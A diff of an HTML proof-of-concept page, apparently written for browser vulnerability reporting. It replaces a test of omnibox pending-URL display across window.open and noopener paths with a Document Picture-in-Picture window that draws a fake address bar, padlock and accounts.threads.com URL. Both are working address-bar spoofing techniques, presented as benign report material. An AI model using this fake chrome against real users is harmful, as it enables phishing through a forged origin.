@@ -1,35 +1,46 @@
-<!-- 4 | 2026 · jalur BROWSER-INITIATED lewat noopener | [1-CLICK]
-     ASUMSI YANG DIUJI  "renderer tidak boleh mendorong URL pending ke bar" - benar, TAPI aturan itu
-     berlaku untuk navigasi yang dimulai RENDERER. Tidak semua navigasi begitu.
-     window.open(url, '_blank', 'noopener') memutus hubungan opener, dan di beberapa jalur
-     navigasinya diserahkan ke PROSES BROWSER, bukan renderer. Kalau benar, tab baru itu
-     kembali masuk kategori yang BOLEH menampilkan URL pending - karena belum ada yang commit.
-     Ini bukan varian dari file lama: yang diganti bukan cara-hang, tapi SIAPA YANG MEMULAI navigasi.
-     Tiga jalur ditembak berdampingan supaya bisa dibandingkan langsung:
-       (a) window.open biasa      (renderer-initiated)
-       (b) window.open + noopener (kandidat browser-initiated)
-       (c) <a rel=noopener target=_blank>
-     YANG DIBACA  ketiga tab: mana yang menampilkan URL tujuan padahal belum ada yang commit?
-     Kalau (b) atau (c) berbeda dari (a) -> perbedaan itu temuannya.
-     EXPECTED-SECURE  ketiganya berperilaku sama. -->
-<button onclick="go()">Run 4 (buka 3 tab)</button>
-<a id=lnk href="https://www.google.com:81/" target="_blank" rel="noopener" style="font:13px system-ui;margin-left:8px">(c) buka via anchor rel=noopener</a>
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!DOCTYPE html>
+<!-- SPOOF PoC #5 — MECHANISM: DOCUMENT PICTURE-IN-PICTURE fake chrome (API terbaru, Chrome 116+)
+     Fix-point: window Document-PiP merender HTML sewenang-wenang TANPA bilah alamat/origin sama sekali
+     -> penyerang mengontrol 100% permukaan terlihat. Kelas & surface baru, beda dari semua di atas.
+     Benign: tak memanen kredensial. Buktikan predikat -> screenshot -> STOP -> lapor. -->
+<html lang="id"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>accounts.threads.com</title>
+<style>body{font-family:-apple-system,'Segoe UI',Roboto,Arial;margin:0;padding:28px;max-width:660px}
+h1{font-size:18px}code{background:#f6f8fa;padding:1px 5px;border-radius:4px}
+.cmp{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:14px 0}
+.cmp div{border:1px solid #d0d7de;border-radius:8px;padding:10px;font-size:12px;word-break:break-all}
+.cmp b{display:block;font-size:11px;color:#57606a}.fake{color:#1a7f37}.real{color:#cf222e}
+button{cursor:pointer;font-size:14px;border:1px solid #1a73e8;background:#1a73e8;color:#fff;border-radius:8px;padding:10px 18px;font-weight:600}
+.warn{background:#fff8c5;border:1px solid #d4a72c;border-radius:8px;padding:8px 12px;font-size:12px;color:#7a5c00;margin-top:12px}
+.err{color:#cf222e;font-size:13px;margin-top:8px}</style></head>
+<body>
+<h1>Spoof PoC #5 — Document Picture-in-Picture Fake Chrome</h1>
+<p>API <code>documentPictureInPicture</code> membuka window melayang di atas semua app <b>tanpa bilah alamat</b>. Kita gambar chrome browser palsu di dalamnya — tak ada origin asli untuk membantah.</p>
+<div class="cmp">
+  <div><b>DISPLAYED (digambar)</b><span class="fake">🔒 https://accounts.threads.com</span></div>
+  <div><b>REAL</b><span class="real">window PiP tanpa origin bar</span></div>
+</div>
+<button onclick="go()">▶ Buka Document-PiP (fake chrome)</button>
+<div id="err" class="err"></div>
+<div class="warn">Vulnerable bila window PiP menampilkan bilah alamat palsu meyakinkan tanpa indikator origin dari browser. Screenshot → STOP → lapor.</div>
 <script>
-var T = 'https://www.google.com:81/';   // port yang paketnya di-DROP -> pending panjang
-g.textContent = 'REAL ORIGIN: ' + location.href;
-function go() {
-  var a = window.open(T, '_blank');
-  var b = window.open(T, '_blank', 'noopener');
-  g.textContent = 'REAL ORIGIN: ' + location.origin +
-    '\ntujuan: ' + T +
-    '\n\n(a) window.open biasa      -> opener ' + (a ? 'ADA' : 'null') +
-    '\n(b) window.open + noopener -> opener ' + (b ? 'ADA' : 'null (browser-initiated?)') +
-    '\n(c) anchor rel=noopener    -> klik link di atas' +
-    '\n\nBandingkan omnibox KETIGA tab. Sama = aturan seragam.' +
-    '\nBeda = ada jalur yang masih menampilkan URL pending -> itu pintunya.' +
-    '\n\nCATATAN: kalau ketiganya langsung error-page, port ' + T.split(":")[2] +
-    '\nme-RST (bukan drop) di jaringanmu. Ganti ke 81/444/4444/8081 dan ulangi -' +
-    '\nDROP memberi pending panjang, RST memberi commit instan. Ini knob penentu.';
+const FAKE='https://accounts.threads.com/signin';
+async function go(){
+  const err=document.getElementById('err');err.textContent='';
+  if(!('documentPictureInPicture' in window)){err.textContent='API tak didukung browser ini (butuh Chrome/Edge 116+ desktop, konteks HTTPS/localhost).';return;}
+  try{
+    const pip=await documentPictureInPicture.requestWindow({width:440,height:200});
+    const d=pip.document;
+    d.body.style.cssText='margin:0;font-family:system-ui;background:#fff;color:#202124';
+    d.body.innerHTML=`
+      <div style="background:#dee1e6;display:flex;gap:8px;align-items:center;padding:6px 10px">
+        <span>←</span><span>→</span><span>⟳</span>
+        <div style="background:#fff;border-radius:9px 9px 0 0;padding:6px 12px;font-size:12px">🔒 Threads</div>
+        <div style="flex:1;background:#fff;border-radius:16px;padding:6px 12px;font-size:13px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis">
+          <span style="color:#188038">🔒</span> ${FAKE}</div><span>⋮</span></div>
+      <div style="padding:16px">
+        <b style="color:#b00020">POC spoofing</b> — bilah alamat &amp; gembok di atas 100% HTML, bukan browser.
+        <p style="color:#5f6368;font-size:13px;margin:8px 0 0">Window ini tak punya origin bar asli.</p></div>`;
+  }catch(e){ err.textContent='Gagal: '+(e.message||e)+' (butuh gesture pengguna + HTTPS/localhost).'; }
 }
-</script>
+</script></body></html>
